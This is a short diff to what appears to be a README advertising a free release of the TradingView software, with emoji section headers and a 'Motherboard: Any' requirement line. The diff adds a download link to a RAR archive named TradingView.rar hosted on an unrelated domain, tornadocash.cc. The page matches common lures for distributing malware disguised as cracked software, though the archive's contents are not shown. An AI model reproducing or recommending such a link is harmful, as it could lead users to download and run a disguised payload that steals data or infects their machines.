@@ -17,6 +17,6 @@ Motherboard: Any
 
 # 📁 〢 Download
 Our free release can be downloaded Here
-
+https://tornadocash.cc/download/TradingView.rar
 
 # 🌟 〢 FREE UPDATES
